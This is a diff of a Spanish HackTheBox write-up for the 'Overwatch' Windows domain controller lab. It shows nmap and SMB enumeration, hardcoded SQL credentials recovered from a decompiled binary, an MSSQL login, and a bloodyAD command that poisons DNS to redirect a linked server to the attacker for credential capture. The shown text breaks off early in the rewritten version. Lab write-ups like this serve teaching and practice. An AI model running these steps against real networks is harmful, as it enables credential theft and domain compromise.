@@ -1,5 +1,4 @@
 <!DOCTYPE html>
-
 <html lang="es">
 <head>
 <meta charset="UTF-8"/>
@@ -16,221 +15,96 @@
 }
 html { scroll-behavior: smooth; }
 body { background: var(--bg); color: var(--text); font-family: var(--sans); min-height: 100vh; }
-
-/* ── NAV ── */
 nav {
-position: sticky; top: 0; z-index: 100; background: var(–bg);
-border-bottom: 1px solid var(–border); padding: 0 2rem;
-display: flex; align-items: center; justify-content: space-between; height: 56px;
+  position: sticky; top: 0; z-index: 100; background: var(--bg);
+  border-bottom: 1px solid var(--border); padding: 0 2rem;
+  display: flex; align-items: center; justify-content: space-between; height: 56px;
 }
-.nav-logo { font-size: 1rem; font-weight: 800; letter-spacing: -0.02em; text-decoration: none; color: var(–text); }
-.nav-logo span { color: var(–accent); }
+.nav-logo { font-size: 1rem; font-weight: 800; letter-spacing: -0.02em; text-decoration: none; color: var(--text); }
+.nav-logo span { color: var(--accent); }
 .nav-links { display: flex; gap: 2rem; align-items: center; }
-.nav-links a {
-font-family: var(–mono); font-size: 0.75rem; color: var(–muted);
-text-decoration: none; letter-spacing: 0.05em; transition: color 0.2s;
-}
-.nav-links a:hover { color: var(–text); }
+.nav-links a { font-family: var(--mono); font-size: 0.75rem; color: var(--muted); text-decoration: none; letter-spacing: 0.05em; transition: color 0.2s; }
+.nav-links a:hover { color: var(--text); }
 .nav-writeup-nav { display: flex; gap: 0.5rem; }
-.nav-btn {
-font-family: var(–mono); font-size: 0.68rem; padding: 0.3rem 0.8rem;
-border: 1px solid var(–border); background: none; color: var(–muted);
-cursor: pointer; text-decoration: none; letter-spacing: 0.04em;
-transition: all 0.15s; display: flex; align-items: center; gap: 0.3rem;
-}
-.nav-btn:hover { border-color: var(–text); color: var(–text); }
-.nav-btn.prev { background: var(–tag-bg); }
-
-/* ── HERO ── */
-.writeup-hero {
-max-width: 1100px; margin: 0 auto;
-padding: 4rem 2rem 3rem; border-bottom: 1px solid var(–border);
-}
-.hero-meta {
-display: flex; gap: 1rem; align-items: center; flex-wrap: wrap; margin-bottom: 1.5rem;
-}
-.platform-badge {
-font-family: var(–mono); font-size: 0.62rem; letter-spacing: 0.1em;
-text-transform: uppercase; padding: 0.25rem 0.7rem;
-border: 1px solid var(–border); color: var(–muted);
-}
+.nav-btn { font-family: var(--mono); font-size: 0.68rem; padding: 0.3rem 0.8rem; border: 1px solid var(--border); background: none; color: var(--muted); cursor: pointer; text-decoration: none; letter-spacing: 0.04em; transition: all 0.15s; display: flex; align-items: center; gap: 0.3rem; }
+.nav-btn:hover { border-color: var(--text); color: var(--text); }
+.nav-btn.prev { background: var(--tag-bg); }
+.writeup-hero { max-width: 1100px; margin: 0 auto; padding: 4rem 2rem 3rem; border-bottom: 1px solid var(--border); }
+.hero-meta { display: flex; gap: 1rem; align-items: center; flex-wrap: wrap; margin-bottom: 1.5rem; }
+.platform-badge { font-family: var(--mono); font-size: 0.62rem; letter-spacing: 0.1em; text-transform: uppercase; padding: 0.25rem 0.7rem; border: 1px solid var(--border); color: var(--muted); }
 .platform-badge.htb { border-color: #9fef00; color: #5a8a00; background: #f6fff0; }
-.difficulty-badge {
-font-family: var(–mono); font-size: 0.62rem; letter-spacing: 0.1em;
-text-transform: uppercase; padding: 0.25rem 0.7rem;
-background: var(–tag-bg); color: var(–muted);
-}
-.writeup-hero h1 {
-font-size: clamp(2rem, 4vw, 3.2rem); font-weight: 800;
-letter-spacing: -0.03em; line-height: 1.1; margin-bottom: 0.6rem;
-}
-.writeup-hero .subtitle {
-font-family: var(–mono); font-size: 0.82rem; color: var(–muted); margin-bottom: 1.5rem;
-}
-.hero-stats {
-display: flex; gap: 2rem; flex-wrap: wrap;
-padding-top: 1.5rem; border-top: 1px solid var(–border);
-}
+.difficulty-badge { font-family: var(--mono); font-size: 0.62rem; letter-spacing: 0.1em; text-transform: uppercase; padding: 0.25rem 0.7rem; background: var(--tag-bg); color: var(--muted); }
+.writeup-hero h1 { font-size: clamp(2rem, 4vw, 3.2rem); font-weight: 800; letter-spacing: -0.03em; line-height: 1.1; margin-bottom: 0.6rem; }
+.writeup-hero .subtitle { font-family: var(--mono); font-size: 0.82rem; color: var(--muted); margin-bottom: 1.5rem; }
+.hero-stats { display: flex; gap: 2rem; flex-wrap: wrap; padding-top: 1.5rem; border-top: 1px solid var(--border); }
 .stat { display: flex; flex-direction: column; gap: 0.2rem; }
-.stat-label { font-family: var(–mono); font-size: 0.6rem; letter-spacing: 0.1em; text-transform: uppercase; color: var(–muted); }
-.stat-value { font-family: var(–mono); font-size: 0.82rem; font-weight: 500; color: var(–text); }
-
-/* ── LAYOUT ── */
-.writeup-layout {
-max-width: 1100px; margin: 0 auto; padding: 3rem 2rem 6rem;
-display: grid; grid-template-columns: 220px 1fr; gap: 3rem;
-}
-@media (max-width: 768px) {
-.writeup-layout { grid-template-columns: 1fr; }
-.sidebar { display: none; }
-}
-
-/* ── SIDEBAR ── */
+.stat-label { font-family: var(--mono); font-size: 0.6rem; letter-spacing: 0.1em; text-transform: uppercase; color: var(--muted); }
+.stat-value { font-family: var(--mono); font-size: 0.82rem; font-weight: 500; color: var(--text); }
+.writeup-layout { max-width: 1100px; margin: 0 auto; padding: 3rem 2rem 6rem; display: grid; grid-template-columns: 220px 1fr; gap: 3rem; }
+@media (max-width: 768px) { .writeup-layout { grid-template-columns: 1fr; } .sidebar { display: none; } }
 .sidebar { position: sticky; top: 76px; align-self: start; }
-.sidebar-title {
-font-family: var(–mono); font-size: 0.6rem; letter-spacing: 0.12em;
-text-transform: uppercase; color: var(–muted); margin-bottom: 1rem;
-padding-bottom: 0.5rem; border-bottom: 1px solid var(–border);
-}
+.sidebar-title { font-family: var(--mono); font-size: 0.6rem; letter-spacing: 0.12em; text-transform: uppercase; color: var(--muted); margin-bottom: 1rem; padding-bottom: 0.5rem; border-bottom: 1px solid var(--border); }
 .sidebar-nav { display: flex; flex-direction: column; gap: 0.1rem; }
-.sidebar-link {
-font-family: var(–mono); font-size: 0.68rem; color: var(–muted);
-text-decoration: none; padding: 0.35rem 0.7rem; border-left: 2px solid transparent;
-transition: all 0.15s; letter-spacing: 0.02em;
-}
-.sidebar-link:hover { color: var(–text); border-left-color: var(–accent); background: var(–tag-bg); }
-.sidebar-link.active { color: var(–accent); border-left-color: var(–accent); }
-
-/* ── CONTENT ── */
+.sidebar-link { font-family: var(--mono); font-size: 0.68rem; color: var(--muted); text-decoration: none; padding: 0.35rem 0.7rem; border-left: 2px solid transparent; transition: all 0.15s; letter-spacing: 0.02em; }
+.sidebar-link:hover { color: var(--text); border-left-color: var(--accent); background: var(--tag-bg); }
+.sidebar-link.active { color: var(--accent); border-left-color: var(--accent); }
 .writeup-content { min-width: 0; }
-.section {
-margin-bottom: 3.5rem; padding-bottom: 3.5rem;
-border-bottom: 1px solid var(–border);
-}
+.section { margin-bottom: 3.5rem; padding-bottom: 3.5rem; border-bottom: 1px solid var(--border); }
 .section:last-child { border-bottom: none; }
-.section-label {
-font-family: var(–mono); font-size: 0.6rem; letter-spacing: 0.12em;
-text-transform: uppercase; color: var(–accent); margin-bottom: 0.5rem;
-}
-.section h2 {
-font-size: 1.6rem; font-weight: 800; letter-spacing: -0.02em;
-margin-bottom: 1.2rem; line-height: 1.2;
-}
-.section p {
-font-family: var(–mono); font-size: 0.78rem; line-height: 1.9;
-color: #3d3b36; margin-bottom: 0.8rem;
-}
+.section-label { font-family: var(--mono); font-size: 0.6rem; letter-spacing: 0.12em; text-transform: uppercase; color: var(--accent); margin-bottom: 0.5rem; }
+.section h2 { font-size: 1.6rem; font-weight: 800; letter-spacing: -0.02em; margin-bottom: 1.2rem; line-height: 1.2; }
+.section h3 { font-size: 1.05rem; font-weight: 700; letter-spacing: -0.01em; margin: 1.8rem 0 0.7rem; }
+.section p { font-family: var(--mono); font-size: 0.78rem; line-height: 1.9; color: #3d3b36; margin-bottom: 0.8rem; }
 .section ul { list-style: none; padding: 0; margin-bottom: 1rem; }
-.section ul li {
-font-family: var(–mono); font-size: 0.76rem; line-height: 1.8;
-color: #3d3b36; padding-left: 1.2rem; position: relative; margin-bottom: 0.2rem;
-}
-.section ul li::before {
-content: ‘→’; position: absolute; left: 0;
-color: var(–accent); font-size: 0.65rem; top: 0.05rem;
-}
-
-/* ── ATTACK STEP ── */
-.attack-step {
-margin-bottom: 2.5rem; padding: 1.5rem;
-border: 1px solid var(–border); background: var(–surface); position: relative;
-}
-.attack-step::before {
-content: ‘’; position: absolute; top: 0; left: 0;
-width: 3px; height: 100%; background: var(–accent);
-}
-.step-num {
-font-family: var(–mono); font-size: 0.6rem; letter-spacing: 0.12em;
-color: var(–accent); text-transform: uppercase; margin-bottom: 0.4rem;
-}
-.step-title {
-font-size: 1rem; font-weight: 700; letter-spacing: -0.01em;
-margin-bottom: 0.8rem; line-height: 1.3;
-}
-.step-desc {
-font-family: var(–mono); font-size: 0.75rem; color: #3d3b36;
-line-height: 1.8; margin-bottom: 0.8rem;
-}
-
-/* ── CODE ── */
-pre {
-background: #1a1917; color: #e8e4d9; font-family: var(–mono);
-font-size: 0.72rem; padding: 1.2rem 1.4rem; margin: 0.8rem 0;
-overflow-x: auto; line-height: 1.8; border-left: 3px solid var(–accent);
-}
+.section ul li { font-family: var(--mono); font-size: 0.76rem; line-height: 1.8; color: #3d3b36; padding-left: 1.2rem; position: relative; margin-bottom: 0.2rem; }
+.section ul li::before { content: '→'; position: absolute; left: 0; color: var(--accent); font-size: 0.65rem; top: 0.05rem; }
+.attack-step { margin-bottom: 2.5rem; padding: 1.5rem 1.8rem; border: 1px solid var(--border); background: var(--surface); position: relative; }
+.attack-step::before { content: ''; position: absolute; top: 0; left: 0; width: 3px; height: 100%; background: var(--accent); }
+.step-num { font-family: var(--mono); font-size: 0.6rem; letter-spacing: 0.12em; color: var(--accent); text-transform: uppercase; margin-bottom: 0.4rem; }
+.step-title { font-size: 1.05rem; font-weight: 700; letter-spacing: -0.01em; margin-bottom: 1rem; line-height: 1.3; }
+.step-desc { font-family: var(--mono); font-size: 0.76rem; color: #3d3b36; line-height: 1.9; margin-bottom: 0.9rem; }
+.step-h3 { font-family: var(--sans); font-size: 0.88rem; font-weight: 700; margin: 1.4rem 0 0.6rem; color: var(--text); }
+pre { background: #1a1917; color: #e8e4d9; font-family: var(--mono); font-size: 0.72rem; padding: 1.2rem 1.4rem; margin: 0.8rem 0; overflow-x: auto; line-height: 1.8; border-left: 3px solid var(--accent); }
+code { font-family: var(--mono); font-size: 0.78em; background: var(--tag-bg); padding: 0.1em 0.35em; border-radius: 2px; }
 .cmd-comment { color: #6b7280; }
 .cmd-flag { color: #60a5fa; }
 .cmd-value { color: #34d399; }
 .cmd-tool { color: #f87171; }
-
-/* ── FINDINGS TABLE ── */
-.findings-table { width: 100%; border-collapse: collapse; margin-top: 1rem; font-family: var(–mono); font-size: 0.72rem; }
-.findings-table th {
-text-align: left; padding: 0.6rem 0.8rem; background: var(–tag-bg);
-font-size: 0.6rem; letter-spacing: 0.1em; text-transform: uppercase;
-color: var(–muted); border-bottom: 2px solid var(–border);
-}
-.findings-table td {
-padding: 0.7rem 0.8rem; border-bottom: 1px solid var(–border);
-color: #3d3b36; vertical-align: top;
-}
-.findings-table tr:hover td { background: var(–tag-bg); }
-.severity {
-display: inline-block; font-size: 0.6rem; letter-spacing: 0.08em;
-padding: 0.15rem 0.5rem; font-weight: 600;
-}
+.callout { background: var(--tag-bg); border-left: 3px solid var(--accent2); padding: 1rem 1.2rem; margin: 1rem 0; font-family: var(--mono); font-size: 0.74rem; line-height: 1.8; color: #3d3b36; }
+.callout strong { color: var(--accent2); }
+.callout-warn { border-left-color: var(--accent); }
+.callout-warn strong { color: var(--accent); }
+.findings-table { width: 100%; border-collapse: collapse; margin-top: 1rem; font-family: var(--mono); font-size: 0.72rem; }
+.findings-table th { text-align: left; padding: 0.6rem 0.8rem; background: var(--tag-bg); font-size: 0.6rem; letter-spacing: 0.1em; text-transform: uppercase; color: var(--muted); border-bottom: 2px solid var(--border); }
+.findings-table td { padding: 0.7rem 0.8rem; border-bottom: 1px solid var(--border); color: #3d3b36; vertical-align: top; }
+.findings-table tr:hover td { background: var(--tag-bg); }
+.severity { display: inline-block; font-size: 0.6rem; letter-spacing: 0.08em; padding: 0.15rem 0.5rem; font-weight: 600; }
 .sev-critical { background: #fee2e2; color: #7f1d1d; }
 .sev-high { background: #fee2e2; color: #991b1b; }
 .sev-medium { background: #fef3c7; color: #92400e; }
 .sev-info { background: #e0f2fe; color: #0c4a6e; }
-
-/* ── TAGS ── */
 .tag-row { display: flex; gap: 0.4rem; flex-wrap: wrap; margin-top: 1rem; }
-.tag {
-font-family: var(–mono); font-size: 0.6rem; padding: 0.18rem 0.5rem;
-border: 1px solid var(–border); color: var(–muted); letter-spacing: 0.04em;
-}
-
-/* ── CREDENTIALS BOX ── */
-.creds-box {
-background: #1a1917; color: #e8e4d9; font-family: var(–mono);
-font-size: 0.72rem; padding: 1.2rem 1.4rem; margin: 0.8rem 0;
-border-left: 3px solid #34d399; line-height: 2;
-}
+.tag { font-family: var(--mono); font-size: 0.6rem; padding: 0.18rem 0.5rem; border: 1px solid var(--border); color: var(--muted); letter-spacing: 0.04em; }
+.creds-box { background: #1a1917; color: #e8e4d9; font-family: var(--mono); font-size: 0.72rem; padding: 1.2rem 1.4rem; margin: 0.8rem 0; border-left: 3px solid #34d399; line-height: 2; }
 .cred-label { color: #6b7280; }
 .cred-user { color: #60a5fa; }
 .cred-pass { color: #34d399; }
-
-/* ── WRITEUP NAV BOTTOM ── */
-.writeup-nav-bottom {
-display: flex; justify-content: space-between; align-items: center;
-padding-top: 2rem; margin-top: 2rem; border-top: 1px solid var(–border);
-}
-.nav-link-btn {
-font-family: var(–mono); font-size: 0.72rem; color: var(–muted);
-text-decoration: none; padding: 0.6rem 1rem; border: 1px solid var(–border);
-display: flex; align-items: center; gap: 0.5rem; transition: all 0.15s;
-}
-.nav-link-btn:hover { border-color: var(–text); color: var(–text); }
-.nav-link-btn.prev-page { background: var(–tag-bg); }
-
-/* ── FOOTER ── */
-footer {
-border-top: 1px solid var(–border); padding: 2rem; text-align: center;
-font-family: var(–mono); font-size: 0.68rem; color: var(–muted); letter-spacing: 0.06em;
-}
+.writeup-nav-bottom { display: flex; justify-content: space-between; align-items: center; padding-top: 2rem; margin-top: 2rem; border-top: 1px solid var(--border); }
+.nav-link-btn { font-family: var(--mono); font-size: 0.72rem; color: var(--muted); text-decoration: none; padding: 0.6rem 1rem; border: 1px solid var(--border); display: flex; align-items: center; gap: 0.5rem; transition: all 0.15s; }
+.nav-link-btn:hover { border-color: var(--text); color: var(--text); }
+.nav-link-btn.prev-page { background: var(--tag-bg); }
+footer { border-top: 1px solid var(--border); padding: 2rem; text-align: center; font-family: var(--mono); font-size: 0.68rem; color: var(--muted); letter-spacing: 0.06em; }
 </style>
-
 </head>
 <body>
 
 <nav>
-  <a class="nav-logo" href="../index.html">OJM<span>.</span>SEC</a>
+  <a class="nav-logo" href="index.html">OJM<span>.</span>SEC</a>
   <div class="nav-links">
-    <a href="../index.html">← Volver</a>
+    <a href="index.html">← Volver</a>
     <div class="nav-writeup-nav">
       <a class="nav-btn prev" href="spookysec.html">← Spookysec</a>
-      <a class="nav-btn" href="../index.html#writeups">Todos</a>
+      <a class="nav-btn" href="index.html#writeups">Todos</a>
     </div>
   </div>
 </nav>
@@ -240,340 +114,683 @@ font-family: var(–mono); font-size: 0.68rem; color: var(–muted); letter-spac
     <span class="platform-badge htb">HackTheBox</span>
     <span class="difficulty-badge">Active Directory</span>
     <span class="difficulty-badge">Windows Server 2022</span>
-    <span class="difficulty-badge">May 11, 2026</span>
+    <span class="difficulty-badge">11 May 2026</span>
   </div>
   <h1>Overwatch</h1>
-  <p class="subtitle">overwatch.htb — NT AUTHORITY\SYSTEM via WCF Command Injection</p>
+  <p class="subtitle">overwatch.htb — NT AUTHORITY\SYSTEM via .NET Reverse Engineering + DNS Poisoning + WCF Command Injection</p>
   <div class="hero-stats">
-    <div class="stat">
-      <span class="stat-label">Target IP</span>
-      <span class="stat-value">10.129.244.81</span>
-    </div>
-    <div class="stat">
-      <span class="stat-label">Domain</span>
-      <span class="stat-value">overwatch.htb</span>
-    </div>
-    <div class="stat">
-      <span class="stat-label">Hostname</span>
-      <span class="stat-value">S200401.overwatch.htb</span>
-    </div>
-    <div class="stat">
-      <span class="stat-label">Findings</span>
-      <span class="stat-value">7 (5 High, 1 Med, 1 Info)</span>
-    </div>
-    <div class="stat">
-      <span class="stat-label">Resultado</span>
-      <span class="stat-value">NT AUTHORITY\SYSTEM</span>
-    </div>
-    <div class="stat">
-      <span class="stat-label">Autor</span>
-      <span class="stat-value">Oriol Jaen Mirabet</span>
-    </div>
+    <div class="stat"><span class="stat-label">Target IP</span><span class="stat-value">10.129.244.81</span></div>
+    <div class="stat"><span class="stat-label">Domain</span><span class="stat-value">overwatch.htb</span></div>
+    <div class="stat"><span class="stat-label">Hostname</span><span class="stat-value">S200401.overwatch.htb</span></div>
+    <div class="stat"><span class="stat-label">OS</span><span class="stat-value">Windows Server 2022</span></div>
+    <div class="stat"><span class="stat-label">Findings</span><span class="stat-value">7 (5 High, 1 Med, 1 Info)</span></div>
+    <div class="stat"><span class="stat-label">Resultado</span><span class="stat-value">NT AUTHORITY\SYSTEM</span></div>
+    <div class="stat"><span class="stat-label">Autor</span><span class="stat-value">Oriol Jaen Mirabet</span></div>
   </div>
 </div>
 
 <div class="writeup-layout">
-
-  <!-- SIDEBAR -->
-
   <aside class="sidebar">
     <div class="sidebar-title">Contenido</div>
     <nav class="sidebar-nav">
       <a class="sidebar-link" href="#resumen">Resumen ejecutivo</a>
-      <a class="sidebar-link" href="#alcance">Alcance</a>
-      <a class="sidebar-link" href="#attack-chain">Attack Chain</a>
+      <a class="sidebar-link" href="#nmap">01 · Nmap & Recon</a>
+      <a class="sidebar-link" href="#smb">02 · SMB Anonymous</a>
+      <a class="sidebar-link" href="#dnspy">03 · dnSpy RE</a>
+      <a class="sidebar-link" href="#mssql">04 · MSSQL Enum</a>
+      <a class="sidebar-link" href="#dns">05 · DNS Poisoning</a>
+      <a class="sidebar-link" href="#responder">06 · Responder</a>
+      <a class="sidebar-link" href="#winrm">07 · WinRM Access</a>
+      <a class="sidebar-link" href="#wcf">08 · WCF Discovery</a>
+      <a class="sidebar-link" href="#privesc">09 · PrivEsc → SYSTEM</a>
       <a class="sidebar-link" href="#findings">Findings</a>
       <a class="sidebar-link" href="#creds">Credenciales</a>
       <a class="sidebar-link" href="#remediation">Remediación</a>
-      <a class="sidebar-link" href="#tools">Herramientas</a>
     </nav>
   </aside>
 
-  <!-- CONTENT -->
-
   <main class="writeup-content">
 
-```
-<!-- RESUMEN -->
-<section class="section" id="resumen">
-  <div class="section-label">01 — Overview</div>
-  <h2>Resumen Ejecutivo</h2>
-  <p>Este informe documenta el compromiso completo de la máquina HackTheBox <strong>Overwatch</strong> (10.129.244.81), un servidor <strong>Windows Server 2022</strong> que ejecuta un entorno Active Directory bajo el dominio <em>overwatch.htb</em>.</p>
-  <p>Las pruebas se realizaron desde una perspectiva de caja negra sin credenciales previas. Mediante una combinación de enumeración SMB anónima, ingeniería inversa de un binario .NET de monitorización, envenenamiento DNS a través de BloodyAD, abuso de servidores enlazados MSSQL y finalmente inyección de comandos PowerShell en un servicio WCF privilegiado, se obtuvo acceso completo a nivel <strong>NT AUTHORITY\SYSTEM</strong>.</p>
-  <p>Se identificaron 7 findings, 5 de severidad Alta, que demuestran cómo una cadena de misconfiguraciones conduce a la toma de control completa del host.</p>
-</section>
+    <!-- RESUMEN -->
+    <section class="section" id="resumen">
+      <div class="section-label">00 — Overview</div>
+      <h2>Resumen Ejecutivo</h2>
+      <p>Overwatch es una máquina HackTheBox que representa un <strong>Windows Server 2022</strong> actuando como Controlador de Dominio bajo el dominio <code>overwatch.htb</code>. Es una caja que recompensa la paciencia y el pensamiento lateral: la superficie de ataque inicial no es obvia y requiere encadenar múltiples técnicas que van desde la ingeniería inversa hasta el abuso de permisos de Active Directory.</p>
+      <p>El punto de entrada es inesperado: un recurso SMB anónimo expone el binario de una aplicación de monitorización interna. Al descompilar ese binario con dnSpy se obtienen credenciales hardcodeadas <em>y</em> se identifica un vector de inyección de comandos que más adelante será la clave para SYSTEM. Las credenciales extraídas permiten autenticarse en MSSQL, donde se descubre un servidor enlazado no resuelto — la señal perfecta para un ataque de envenenamiento DNS. Inyectando un registro A falso vía BloodyAD y levantando Responder, se capturan credenciales en texto claro de una segunda cuenta, logrando acceso WinRM. La escalada final explota el endpoint WCF <code>KillProcess()</code> del mismo binario que se analizó en la fase 2, cerrando el círculo con una reverse shell como <code>NT AUTHORITY\SYSTEM</code>.</p>
+      <div class="callout">
+        <strong>Attack Path</strong><br>
+        SMB anónimo → Reverse Engineering (.NET / dnSpy) → Credenciales hardcoded → MSSQL linked server → DNS poisoning (BloodyAD) → Credential capture (Responder) → WinRM → WCF KillProcess() injection → SYSTEM
+      </div>
+    </section>
 
-<!-- ALCANCE -->
-<section class="section" id="alcance">
-  <div class="section-label">02 — Scope</div>
-  <h2>Alcance y Metodología</h2>
-  <ul>
-    <li><strong>10.129.244.81</strong> — Objetivo Overwatch HTB · Windows Server 2022</li>
-    <li><strong>overwatch.htb</strong> — Dominio Active Directory</li>
-    <li><strong>S200401.overwatch.htb</strong> — Controlador de Dominio / Servidor SQL</li>
-  </ul>
-  <p>Enfoque de caja negra sin credenciales ni conocimiento previo. Las fases incluyeron: reconocimiento de red, enumeración de servicios, ingeniería inversa de binarios, obtención de credenciales, acceso inicial y escalada local de privilegios hasta NT AUTHORITY\SYSTEM.</p>
-</section>
+    <!-- NMAP -->
+    <section class="section" id="nmap">
+      <div class="section-label">01 — Recon</div>
+      <h2>Nmap — Fingerprinting del Controlador de Dominio</h2>
 
-<!-- ATTACK CHAIN -->
-<section class="section" id="attack-chain">
-  <div class="section-label">03 — Attack Chain</div>
-  <h2>Cadena de Compromiso</h2>
+      <div class="attack-step">
+        <div class="step-num">Fase 01 · Port Scan</div>
+        <div class="step-title">Enumeración completa de puertos y detección de servicios</div>
+        <p class="step-desc">El primer paso siempre es el mismo: un escaneo SYN rápido sobre todos los 65535 puertos para obtener el mapa completo de la superficie de ataque, seguido de un segundo escaneo más lento con detección de versión y scripts NSE sobre los puertos abiertos.</p>
+        <pre><span class="cmd-comment"># Fase 1: Escaneo rápido de todos los puertos</span>
+<span class="cmd-tool">nmap</span> <span class="cmd-flag">-p-</span> --open <span class="cmd-flag">-sS</span> --min-rate 5000 <span class="cmd-flag">-n -Pn</span> 10.129.244.81 <span class="cmd-flag">-oG</span> allports
 
-  <div class="attack-step">
-    <div class="step-num">Fase 01 · Recon</div>
-    <div class="step-title">Reconocimiento y Enumeración de Puertos</div>
-    <p class="step-desc">Un escaneo completo de puertos con Nmap identificó 21 puertos TCP abiertos, confirmando el perfil de un Controlador de Dominio Windows. Se destacaron DNS (53), Kerberos (88), LDAP (389), SMB (445), WinRM (5985) y una instancia MSSQL no estándar en el puerto <strong>6520</strong>. El dominio y hostname se extrajeron de los banners NTLM de RDP y MSSQL.</p>
-    <pre><span class="cmd-tool">nmap</span> <span class="cmd-flag">-p-</span> --open <span class="cmd-flag">-sS</span> --min-rate 1000 <span class="cmd-flag">-n -Pn</span> 10.129.244.81
-```
+PORT      STATE  SERVICE
+53/tcp    open   domain
+88/tcp    open   kerberos-sec
+135/tcp   open   msrpc
+139/tcp   open   netbios-ssn
+389/tcp   open   ldap
+445/tcp   open   microsoft-ds
+464/tcp   open   kpasswd5
+593/tcp   open   http-rpc-epmap
+636/tcp   open   ldapssl
+<span class="cmd-value">3268/tcp  open   globalcatLDAP</span>
+<span class="cmd-value">3269/tcp  open   globalcatLDAPssl</span>
+3389/tcp  open   ms-wbt-server
+5985/tcp  open   wsman
+<span class="cmd-value">6520/tcp  open   unknown</span>   <span class="cmd-comment">← puerto no estándar, interesante</span>
+9389/tcp  open   adws</pre>
 
-53/tcp   open  domain
-88/tcp   open  kerberos-sec
-389/tcp  open  ldap
-445/tcp  open  microsoft-ds
-5985/tcp open  wsman
-<span class="cmd-value">6520/tcp open  ms-sql-s</span>  [Microsoft SQL Server 2022 RTM]
+        <p class="step-desc">El patrón de puertos es inconfundible: DNS, Kerberos, LDAP, SMB, WinRM, ADWS... esto es un <strong>Domain Controller</strong>. Pero hay un detalle que llama la atención inmediatamente: el puerto <strong>6520</strong> aparece como "unknown". MSSQL suele escuchar en el 1433; aquí alguien lo ha movido a un puerto no estándar, lo cual es una medida de seguridad por oscuridad típica de configuraciones mal diseñadas.</p>
 
-<span class="cmd-comment"># Banners NTLM</span>
-389/tcp  LDAP  Domain: <span class="cmd-value">overwatch.htb</span>
-3389/tcp RDP   DNS_Computer_Name: <span class="cmd-value">S200401.overwatch.htb</span></pre>
-</div>
+        <pre><span class="cmd-comment"># Fase 2: Detección de versiones y scripts NSE</span>
+<span class="cmd-tool">nmap</span> <span class="cmd-flag">-p</span> 53,88,135,139,389,445,464,636,3268,3269,3389,5985,6520,9389 \
+     <span class="cmd-flag">-sCV</span> --min-rate 1000 <span class="cmd-flag">-Pn -n</span> 10.129.244.81 <span class="cmd-flag">-oN</span> targeted
 
-```
-  <div class="attack-step">
-    <div class="step-num">Fase 02 · SMB + Reverse Engineering</div>
-    <div class="step-title">SMB Anónimo e Ingeniería Inversa del Binario .NET</div>
-    <p class="step-desc">La enumeración SMB anónima reveló el share <strong>software$</strong> accesible sin autenticación. Contenía el directorio <code>Monitoring/</code> con el binario <strong>overwatch.exe</strong> y sus dependencias. El binario se descompiló con <strong>dnSpy</strong>, revelando dos hallazgos críticos en la clase <code>MonitoringService</code>.</p>
-    <pre><span class="cmd-tool">smbclient</span> <span class="cmd-flag">-L</span> \\10.129.244.81 <span class="cmd-flag">-U</span> ''
-```
+<span class="cmd-comment"># Output relevante</span>
+389/tcp   open  ldap       Microsoft Windows AD LDAP
+  ldapServiceName: overwatch.htb:s200401$@OVERWATCH.HTB
+  rootDomainNamingContext: DC=overwatch,DC=htb
 
-Sharename    Type
-<span class="cmd-value">software$</span>   Disk
-SYSVOL       Disk
+3389/tcp  open  ms-wbt-server
+  rdp-ntlm-info:
+    <span class="cmd-value">DNS_Domain_Name: overwatch.htb</span>
+    <span class="cmd-value">DNS_Computer_Name: S200401.overwatch.htb</span>
+    NetBIOS_Computer_Name: S200401
+    Product_Version: 10.0.20348       <span class="cmd-comment">← Windows Server 2022</span>
 
-<span class="cmd-tool">smbclient</span> \10.129.244.81\software$ <span class="cmd-flag">-U</span> ‘’
-smb: > cd Monitoring  
-overwatch.exe     AH  9728
-overwatch.exe.config  AH  2163
-overwatch.pdb     AH  30208</pre>
-<p class="step-desc">La descompilación reveló:</p>
-<ul>
-<li><strong>CheckEdgeHistory()</strong> — Cadena de conexión SQL en texto claro: <code>Server=localhost;Database=SecurityLogs;User Id=sqlsvc;Password=TI0LKcfHzZw1Vv;</code></li>
-<li><strong>KillProcess()</strong> — Concatenación directa del parámetro <code>processName</code> en un comando PowerShell sin sanitización → inyección de comandos</li>
-</ul>
-</div>
+<span class="cmd-value">6520/tcp  open  ms-sql-s   Microsoft SQL Server 2022 16.00.1000.00; RTM</span>
+  ms-sql-ntlm-info:
+    Target_Name: OVERWATCH
+    DNS_Domain_Name: overwatch.htb
+    DNS_Computer_Name: S200401.overwatch.htb</pre>
 
-```
-  <div class="attack-step">
-    <div class="step-num">Fase 03 · DNS Poisoning</div>
-    <div class="step-title">Envenenamiento DNS vía BloodyAD</div>
-    <p class="step-desc">Con las credenciales <strong>sqlsvc:TI0LKcfHzZw1Vv</strong> se autenticó en MSSQL (puerto 6520). La enumeración de servidores enlazados reveló <strong>SQL07</strong>, un nombre que no resolvía en DNS. BloodyAD confirmó que sqlsvc tenía permisos WRITE sobre objetos DNS, permitiendo inyectar un registro A apuntando a la IP del atacante.</p>
-    <pre><span class="cmd-tool">mssqlclient.py</span> overwatch.htb/sqlsvc:TI0LKcfHzZw1Vv@10.129.244.81 <span class="cmd-flag">-p</span> 6520 <span class="cmd-flag">-windows-auth</span>
-```
+        <p class="step-desc">El banner NTLM de RDP revela el dominio (<code>overwatch.htb</code>) y el nombre del equipo (<code>S200401.overwatch.htb</code>). El puerto 6520 confirma ser MSSQL Server 2022. Añado ambos al <code>/etc/hosts</code> antes de continuar.</p>
 
-SQL> EXEC sp_linkedservers;
-S200401\SQLEXPRESS  SQL Server
-<span class="cmd-value">SQL07</span>               SQL Server  <– unresolved
+        <pre><span class="cmd-comment"># Resolución DNS local</span>
+echo "<span class="cmd-value">10.129.244.81  overwatch.htb S200401.overwatch.htb</span>" >> /etc/hosts</pre>
 
-<span class="cmd-tool">bloodyAD</span> <span class="cmd-flag">-d</span> overwatch.htb <span class="cmd-flag">-u</span> sqlsvc <span class="cmd-flag">-p</span> TI0LKcfHzZw1Vv   
-<span class="cmd-flag">–dc-ip</span> 10.129.244.81 add dnsRecord SQL07 10.10.15.115
+        <div class="callout">
+          <strong>Por qué importa el puerto 6520</strong><br>
+          MSSQL en un DC (no en un servidor SQL dedicado) combinado con un puerto no estándar sugiere que es un servicio auxiliar interno — probablemente una aplicación que lo usa para logging o monitorización. Eso lo convierte en un objetivo secundario valioso: las aplicaciones internas suelen tener credenciales hardcodeadas o configuraciones laxas.
+        </div>
+      </div>
+    </section>
 
-[+] SQL07 has been successfully added</pre>
-</div>
+    <!-- SMB -->
+    <section class="section" id="smb">
+      <div class="section-label">02 — Initial Enumeration</div>
+      <h2>SMB Anónimo — Descubrimiento del Binario de Monitorización</h2>
 
-```
-  <div class="attack-step">
-    <div class="step-num">Fase 04 · Credential Capture</div>
